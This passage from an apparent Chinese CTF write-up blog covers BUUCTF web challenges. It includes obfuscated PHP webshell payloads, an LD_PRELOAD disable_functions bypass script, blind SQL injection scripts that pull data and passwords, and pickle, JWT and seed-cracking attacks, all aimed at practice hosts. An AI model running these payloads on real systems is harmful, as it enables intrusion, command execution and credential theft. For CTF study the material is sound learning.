alt="image-20210912153310649"></p><p>这里可以抓包改折扣，当折扣足够小的时候就出现一个重定向</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153400419.png" alt="image-20210912153400419"></p><p>接下来的步骤感觉就有点问题了，当直接在burp改路径的时候会直接跳过一个cookie的修改变成admin</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153441750.png" alt="image-20210912153441750"></p><p>但是直接在url栏修改会要求用户是admin</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153559514.png" alt="image-20210912153559514"></p><p>这就要求修改jwt的cookie</p><p><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT - 废物大师兄 - 博客园 (cnblogs.com)</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153646824.png" alt="image-20210912153646824"></p><p>这里的c-jwt-crack工具不会用，所以就跳过这部分吧</p><p>看登录后的源码看见<a href="http://www.zip路径/">www.zip路径</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153753980.png" alt="image-20210912153753980"></p><p>下载压缩包后发现全为python文件</p><p>这里是利用了python反编译</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912171400636.png" alt="image-20210912171400636"></p><p>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p><p>pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，<br>pickle序列化后的数据，可读性差，人一般无法识别。</p><p>p = pickle.loads(urllib.unquote(become))</p><p>urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：</p><p>（1）pickle.dump(obj, file, [,protocol])</p><pre class="language-none"><code class="language-none">    函数的功能：将obj对象序列化存入已经打开的file中。   参数讲解：obj：想要序列化的obj对象。file:文件名称。protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p>（2）pickle.load(file)</p><pre class="language-none"><code class="language-none">    函数的功能：将file中的对象序列化读出。    参数讲解：file：文件名称。</code></pre><p>（3）pickle.dumps(obj[, protocol])</p><pre class="language-none"><code class="language-none">   函数的功能：将obj对象序列化为string形式，而不是存入文件中。   参数讲解：obj：想要序列化的obj对象。protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p>（4）pickle.loads(string)</p><pre class="language-none"><code class="language-none">   函数的功能：从string中读出序列化前的obj对象。   参数讲解：string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</code></pre><p>检测反序列化方法：</p><pre class="language-none"><code class="language-none">全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。</code></pre><p>防御方法</p><pre class="language-none"><code class="language-none">1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM0NTA4Mg==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>这里采用reduce</p><p>当__reduce__被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt其他的参数我们可以不填</p><p>百度个脚本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914214826558.png" alt="image-20210914214826558"></p><p>把这个值给become里放包就行</p><p>参考链接</p><p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055"> Python魔法方法指南_宇宙浪子的专栏-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/2289#toc-4">Python反序列化漏洞的花式利用 - 先知社区 (aliyun.com)</a></p><hr><p>几天之后的补，jwt那个工具环境弄好了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215436728.png" alt="image-20210914215436728"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215503070.png" alt="image-20210914215503070"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>才发现这就是寒假那个招新赛的原题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133220927.png" alt="image-20210916133220927"></p><p>下划线可以用.来绕过，第二个if可以利用%0a换行绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133253226.png" alt="image-20210916133253226"></p><p>要求本地登录</p><p>抓包改xff</p><p>里面有一段js代码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133335204.png" alt="image-20210916133335204"></p><p>post一个merak值，得到一段代码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133404217.png" alt="image-20210916133404217"></p><p>代码审计</p><p>要求get进一个值且存在一个文件名为这个值的文件，内容为todat is a happy day</p><p>可以用data://text/plain,绕过</p><p>也可以用data:<em>//text/plain;base64,</em></p><p>然后存在一个file_get_contents读取传入的file</p><p>要让这个值经过change函数后为flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133828755.png" alt="image-20210916133828755"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133839192.png" alt="image-20210916133839192"></p><p>传进去，拿flag</p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code&#x3D;$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;&#x2F;&#x2F; ?&gt;</code></pre><p>有eval函数，要试图命令执行，然后preg_match过滤了字母和数字，这里可以利用异或或者是url编码取反来绕过</p><p>取反</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182257977.png" alt="image-20210918182257977"></p><p>成功执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182348259.png" alt="image-20210918182348259"></p><p>这里可以看到禁用的函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182433498.png" alt="image-20210918182433498"></p><p>或者利用异或</p><pre class="language-none"><code class="language-none">code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183044112.png" alt="image-20210918183044112"></p><p>一样可以进入phpinfo页面</p><p>查看到禁用的函数后可以尝试利用取反或者异或写入一句话木马</p><p>//抄的payload</p><pre class="language-none"><code class="language-none">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  &#x2F;&#x2F;别忘了后面的分号或者：?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183814123.png" alt="image-20210918183814123"></p><p>然后蚁剑链接，要执行读取flag的readflag二进制文件才能得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184148817.png" alt="image-20210918184148817"></p><p>但是</p><p>disable_functions禁用的函数太多导致shell不能执行命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184324855.png" alt="image-20210918184324855"></p><p>这里可以用蚁剑的插件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184419549.png" alt="image-20210918184419549"></p><p>还有一种方法</p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE<br>参考链接：<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">EXP地址</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918194317240.png" alt="image-20210918194317240"></p><p>我看不懂，但我大受震撼</p><p>上传bypass.php</p><pre class="language-none"><code class="language-none">&lt;?php    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;;    $cmd &#x3D; $_GET[&quot;cmd&quot;];    $out_path &#x3D; $_GET[&quot;outpath&quot;];    $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;设置EVIL_CMDLINE环境变量    $so_path &#x3D; $_GET[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path);  &#x2F;&#x2F;加载恶意动态库    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  &#x2F;&#x2F;利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;;     unlink($out_path);?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193756871.png" alt="image-20210918193756871"></p><p>最终payload</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193729344.png" alt="image-20210918193729344"></p><p>参考链接</p><p><a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">bypass_disable_functions | 0xCreed (jxustctf.top)</a></p><p>[<a href="https://www.cnblogs.com/yesec/p/12483631.html">BUUOJ记录] [极客大挑战 2019]RCE ME - Ye&#39;sBlog - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105136633/">极客大挑战 2019]RCE ME_末初 · mochu7-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">极客大挑战 2019]RCE ME（取反、异或绕过正则表达式、bypass disable_function）_WHOAMIAnony的博客-CSDN博客_异或绕过</a></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223822994.png" alt="image-20210918223822994"></p><p>不知道密码，sql注入也不成功</p><p>直接把cookie改成username=cookie就行了，不清楚这题在考啥。。。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223845191.png" alt="image-20210918223845191"></p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔盲注，过滤了空格</p><p>(ascii(substr(database(),{},1))={})&quot;.format(i,j)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235150704.png" alt="image-20210918235150704"></p><p>(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={})</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918234900927.png" alt="image-20210918234900927"></p><p>(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={})</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235644493.png" alt="image-20210918235644493"></p><p>(ascii(substr((select(group_concat(value))from(flag))</p><p>脚本：</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot;data &#x3D; &#39;&#39;k &#x3D; 0for i in range(13,50):    k &#x3D; 0    for j in range(43,127):        gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        res &#x3D; requests.get(url+gets)        if &quot;your score is: 100&quot; in res.text:            data +&#x3D; chr(j)            print(data)            k &#x3D; 1            break    if(k &#x3D;&#x3D; 0):        print(&quot;err!&quot;)        exit()    </code></pre><p>因为网络问题加了判断，结果就是跑一会就停了，只能一段一段的跑了</p><p>一定是buu flag太长了（</p><p>算是第一次自己写脚本了</p><p>遍历属实跑的太慢了，抽空学一下二分法的写法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210919002507491.png" alt="image-20210919002507491"></p><p>flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4}</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134432965.png" alt="image-20210921134432965"></p><p>涉及了php的伪随机</p><p>如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的</p><p>查看源码找到check.php</p><pre class="language-php" data-language="php"><code class="language-php">pbEzqyRCJP&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show &#x3D; substr($str, 0, 10);echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;);</code></pre><p>知道前几位了</p><p>根据生成算法逆向出满足php_mt_seed工具要求的参数（百度抄的</p><pre class="language-php" data-language="php"><code class="language-php">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2&#x3D;&#39;pbEzqyRCJP&#39;str3 &#x3D; str1[::-1]length &#x3D; len(str2)res&#x3D;&#39;&#39;for i in range(len(str2)):      for j in range(len(str1)):        if str2[i] &#x3D;&#x3D; str1[j]:            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)#15 15 0 61 1 1 0 61 40 40 0 61 25 25 0 61 16 16 0 61 24 24 0 61 53 53 0 61 38 38 0 61 45 45 0 61 51 51 0 61 </code></pre><p>放到php_mt_seed里跑种子</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134854213.png" alt="image-20210921134854213"></p><p>再利用这个脚本得到最后的值</p><pre class="language-none"><code class="language-none">&lt;?phpmt_srand(499600072);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134936468.png" alt="image-20210921134936468"></p><p>吐槽一下，工业互联网的时候看见一个类似的题，照着这个题的wp没跑出来，今天才知道是php_mt_seed的问题，虽然感觉很离谱</p><p>官网下的爆不出seed，从这里下的可以<a href="https://download.openwall.net/pub/projects/php_mt_seed/">Index of /pub/projects/php_mt_seed (openwall.net)</a></p><p>还有就是一样的种子在php版本不一样的时候出来的值也不一样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921135243406.png" alt="image-20210921135243406"></p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess &#x3D; (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message &#x3D; &#39;Wrong.&#39;;  &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt;  &lt;&#x2F;head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt;    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt;    &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;    &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt;    &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;&lt;?php &#125; ?&gt;    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt;      &lt;input type&#x3D;&quot;submit&quot;&gt;    &lt;&#x2F;form&gt;  &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>这里我本来以为是php伪随机数的漏洞，结果最后查了一下发现是basename函数的漏洞</p><p>它会忽略后面的[\x80-\xff]范围内的字符串，即非ascii字符。例子如下：</p><pre class="language-none"><code class="language-none">php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\x80&quot;));&#39; &#x2F;&#x2F; config.phpphp -r &#39;print(basename(&quot;\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php</code></pre><p><strong>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php/\x80?source来读取flag。</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021163516849.png" alt="image-20211021163516849"></p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>源码泄露</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021165221385.png" alt="image-20211021165221385"></p><p>下载image.php.bak</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &quot;config.php&quot;;$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id&#x3D;addslashes($id);$path&#x3D;addslashes($path);$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image&#x2F;jpeg&quot;);readfile($path);</code></pre><p>GET方式传入变量id的值，若没有则为1<br>GET方式传入变量path的值，若没有则为空<br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（&#39;）、双引号（&quot;）、反斜杠（\）<br>str_replace()函数将两个变量内的\0、%00、&#39;、&#39;都替换为空<br>将变量$id与$path拼接进SQL语句<br>脚本：</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\0&#39;&amp;path&#x3D;&quot;payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot;payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;database &#x3D; &quot;&quot;for i in range(1,1000):low &#x3D; 32high &#x3D; 128mid &#x3D; (low + high) &#x2F;&#x2F; 2while(low &lt; high):payload &#x3D; payload4.format(i,mid)new_url &#x3D; url + payloadr &#x3D; requests.get(new_url)if &quot;JFIF&quot; in r.text:low &#x3D; mid + 1else:high &#x3D; midmid &#x3D; (low + high) &#x2F;&#x2F; 2if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128):breakdatabase +&#x3D; chr(mid)print(database)</code></pre><p>得到密码和用户名登录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180732197.png" alt="image-20211021180732197"></p><p>登录后是个文件上传的页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180749445.png" alt="image-20211021180749445"></p><p>这里要用文件名传一句话木马</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184513558.png" alt="image-20211021184513558"></p><p>在上传后的目录可以看到上传的文件名但是不能访问上传文件的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184345858.png" alt="image-20211021184345858"></p><p>不能用php就用短标签代替</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184319466.png" alt="image-20211021184319466"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184415617.png" alt="image-20211021184415617"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 